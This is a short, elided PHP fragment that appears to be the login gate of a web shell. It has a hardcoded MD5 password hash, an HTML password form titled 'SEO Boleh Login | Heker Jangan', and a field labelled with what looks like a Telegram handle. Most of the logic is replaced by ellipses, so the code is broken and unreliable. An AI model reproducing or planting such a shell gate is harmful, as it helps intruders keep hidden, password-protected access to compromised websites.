...
if (is_logged_in()) {
    ...
    if (isset($_POST['password'])) {
        ...
        $hashed_password = '844ee4ffd1cba2ab8e4fe7c9e2640b70'; // Replace this with your MD5 hashed password
    ...
    <html>
    <head>
        <title>SEO Boleh Login | Heker Jangan</title>
    </head>
    <body>
        <form method="POST" action="">
            <label for="password">telegram haxorqt:</label>
